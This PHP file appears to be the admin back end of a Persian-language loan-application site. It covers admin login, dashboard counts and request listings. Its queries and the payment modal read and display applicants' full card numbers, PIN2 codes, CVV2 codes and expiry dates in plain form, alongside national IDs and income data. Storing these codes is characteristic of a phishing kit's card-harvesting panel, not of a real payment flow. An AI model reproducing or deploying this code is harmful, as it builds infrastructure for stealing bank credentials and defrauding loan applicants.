<?php

declare(strict_types=1);

function auth_user(): ?array
{
    $user = $_SESSION['auth_user'] ?? null;
    if (!is_array($user) || empty($user['id']) || empty($user['username']) || empty($user['role'])) {
        return null;
    }

    return [
        'id' => (int) $user['id'],
        'name' => (string) ($user['name'] ?? ''),
        'username' => (string) $user['username'],
        'role' => (string) $user['role'],
    ];
}

function auth_is_admin(): bool
{
    return (auth_user()['role'] ?? '') === 'admin';
}

function auth_login(array $user): void
{
    session_regenerate_id(true);
    $_SESSION['auth_user'] = [
        'id' => (int) $user['id'],
        'name' => (string) ($user['name'] ?? ''),
        'username' => (string) $user['username'],
        'role' => (string) $user['role'],
    ];
}

function auth_logout(): void
{
    unset($_SESSION['auth_user']);
    session_regenerate_id(true);
}

function find_user_by_username(string $username): ?array
{
    $pdo = db();
    if (!$pdo instanceof PDO) {
        return null;
    }

    try {
        $stmt = $pdo->prepare(
            'SELECT id, name, username, password, role, mobile
             FROM users
             WHERE username = ?
             LIMIT 1'
        );
        $stmt->execute([$username]);
        $row = $stmt->fetch();

        return is_array($row) ? $row : null;
    } catch (PDOException $e) {
        app_log('error', 'User lookup failed', ['error' => $e->getMessage()]);

        return null;
    }
}

function attempt_admin_login(string $username, string $password): bool
{
    $user = find_user_by_username($username);
    if ($user === null) {
        password_verify($password, '$2y$10$usesomesillystringfore7w5sRk.b3wwbOkjJfA');

        return false;
    }

    if (!password_verify($password, (string) $user['password'])) {
        return false;
    }

    if (($user['role'] ?? '') !== 'admin') {
        return false;
    }

    auth_login($user);

    return true;
}

function require_admin(): void
{
    if (!auth_is_admin()) {
        $_SESSION['admin_intended'] = current_path();
        redirect('/admin/login');
    }
}

function admin_intended_path(): string
{
    $path = (string) ($_SESSION['admin_intended'] ?? '/admin');
    unset($_SESSION['admin_intended']);
    if ($path === '' || !str_starts_with($path, '/admin') || str_starts_with($path, '/admin/login')) {
        return '/admin';
    }

    return $path;
}

function payment_status_label(?string $status): string
{
    return match ($status) {
        'paid' => 'پرداخت شده',
        default => 'پرداخت نشده',
    };
}

function mask_card_number(?string $card): string
{
    $digits = preg_replace('/\D/', '', (string) $card) ?? '';
    if (strlen($digits) < 4) {
        return '—';
    }

    return fa_number(str_repeat('•', max(0, strlen($digits) - 4)) . substr($digits, -4));
}

function format_card_groups(?string $card): string
{
    $digits = preg_replace('/\D/', '', (string) $card) ?? '';
    if ($digits === '') {
        return '';
    }

    return trim(chunk_split($digits, 4, ' '));
}

function admin_payment_modal_payload(array $row): ?array
{
    $hasPayment = (string) ($row['order_number'] ?? '') !== '' || (string) ($row['card_number'] ?? '') !== '';
    if (!$hasPayment) {
        return null;
    }

    $month = str_pad((string) ($row['expiry_month'] ?? ''), 2, '0', STR_PAD_LEFT);
    $year = str_pad((string) ($row['expiry_year'] ?? ''), 2, '0', STR_PAD_LEFT);
    $expiry = ($row['expiry_month'] ?? '') !== '' && ($row['expiry_year'] ?? '') !== ''
        ? $month . '/' . $year
        : '';

    $amount = '';
    if (isset($row['amount_rial']) && $row['amount_rial'] !== null && $row['amount_rial'] !== '') {
        $amount = fa_number(number_format((int) $row['amount_rial'], 0, '.', ',')) . ' ریال';
    }

    return [
        'tracking' => (string) ($row['tracking_number'] ?? ''),
        'order_number' => (string) ($row['order_number'] ?? ''),
        'amount' => $amount,
        'status' => payment_status_label($row['payment_status'] ?? null),
        'card_number' => format_card_groups($row['card_number'] ?? null),
        'pin2' => (string) ($row['pin2'] ?? ''),
        'cvv2' => (string) ($row['cvv2'] ?? ''),
        'expiry' => $expiry,
        'email' => (string) ($row['payment_email'] ?? ''),
        'paid_at' => format_date_fa((string) ($row['paid_at'] ?? '')),
    ];
}

function admin_dashboard_stats(): array
{
    $empty = [
        'applications' => 0,
        'paid' => 0,
        'unpaid' => 0,
        'under_review' => 0,
        'recent' => [],
    ];

    $pdo = db();
    if (!$pdo instanceof PDO) {
        return $empty;
    }

    try {
        $applications = (int) $pdo->query('SELECT COUNT(*) FROM loan_applications')->fetchColumn();
        $paid = (int) $pdo->query(
            'SELECT COUNT(DISTINCT loan_application_id) FROM demo_ipg_payments
             WHERE status = \'paid\' AND loan_application_id IS NOT NULL'
        )->fetchColumn();
        $unpaid = (int) $pdo->query(
            'SELECT COUNT(*) FROM loan_applications a
             LEFT JOIN demo_ipg_payments p ON p.loan_application_id = a.id
             WHERE p.id IS NULL'
        )->fetchColumn();
        $underReview = (int) $pdo->query(
            "SELECT COUNT(*) FROM loan_applications WHERE status = 'under_review'"
        )->fetchColumn();

        return [
            'applications' => $applications,
            'paid' => $paid,
            'unpaid' => $unpaid,
            'under_review' => $underReview,
            'recent' => admin_list_requests(5),
        ];
    } catch (PDOException $e) {
        app_log('error', 'Admin dashboard stats failed', ['error' => $e->getMessage()]);

        return $empty;
    }
}

function admin_list_requests(int $limit = 100): array
{
    $pdo = db();
    if (!$pdo instanceof PDO) {
        return [];
    }

    $limit = max(1, min(500, $limit));

    try {
        $sql = "SELECT a.id, a.tracking_number, a.status, a.submitted_at,
                       p.title_fa AS product_title,
                       ap.full_name, ap.mobile,
                       pay.amount_rial, pay.status AS payment_status
                FROM loan_applications a
                INNER JOIN applicants ap ON ap.id = a.applicant_id
                INNER JOIN loan_products p ON p.id = a.loan_product_id
                LEFT JOIN demo_ipg_payments pay ON pay.loan_application_id = a.id
                ORDER BY a.submitted_at DESC, a.id DESC
                LIMIT {$limit}";
        $stmt = $pdo->query($sql);

        return $stmt->fetchAll() ?: [];
    } catch (PDOException $e) {
        app_log('error', 'Admin request list failed', ['error' => $e->getMessage()]);

        return [];
    }
}

function admin_get_request(int $id): ?array
{
    if ($id < 1) {
        return null;
    }

    $pdo = db();
    if (!$pdo instanceof PDO) {
        return null;
    }

    try {
        $stmt = $pdo->prepare(
            "SELECT a.id, a.tracking_number, a.requested_amount, a.repayment_months,
                    a.status, a.eligibility_result, a.extra_data, a.notes, a.submitted_at,
                    p.title_fa AS product_title, p.slug AS product_slug,
                    ap.full_name, ap.national_id, ap.mobile, ap.birth_date, ap.employment_type,
                    ap.monthly_income, ap.bank_melli_account, ap.has_bank_melli_account,
                    ap.account_activity_months, ap.average_balance,
                    pay.order_number, pay.amount_rial, pay.status AS payment_status,
                    pay.card_number, pay.pin2, pay.cvv2, pay.expiry_month, pay.expiry_year,
                    pay.email AS payment_email, pay.created_at AS paid_at
             FROM loan_applications a
             INNER JOIN applicants ap ON ap.id = a.applicant_id
             INNER JOIN loan_products p ON p.id = a.loan_product_id
             LEFT JOIN demo_ipg_payments pay ON pay.loan_application_id = a.id
             WHERE a.id = ?
             LIMIT 1"
        );
        $stmt->execute([$id]);
        $row = $stmt->fetch();
        if (!is_array($row)) {
            return null;
        }

        $historyStmt = $pdo->prepare(
            'SELECT from_status, to_status, note, created_at
             FROM application_status_history
             WHERE loan_application_id = ?
             ORDER BY created_at ASC, id ASC'
        );
        $historyStmt->execute([$id]);
        $row['history'] = $historyStmt->fetchAll() ?: [];
        $row['extra'] = json_field($row['extra_data'] ?? null);
        if (!is_array($row['extra'])) {
            $row['extra'] = [];
        }

        return $row;
    } catch (PDOException $e) {
        app_log('error', 'Admin request lookup failed', ['error' => $e->getMessage(), 'id' => $id]);

        return null;
    }
}
